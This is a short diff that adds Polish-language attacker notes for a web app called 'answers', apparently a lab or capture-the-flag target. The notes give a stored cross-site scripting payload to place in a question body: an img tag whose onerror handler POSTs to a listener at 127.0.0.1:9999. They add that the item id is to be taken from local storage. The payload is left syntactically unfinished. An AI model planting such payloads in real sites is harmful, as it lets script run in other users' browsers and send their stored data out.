@@ -1,0 +1,4 @@
+img src payload w body pytania w aplikacji answers
+<img src=x onerror="fetch('127.0.0.1:9999', {method: 'POST'})
+
+Trzeba wziąć id itemu z local storage.
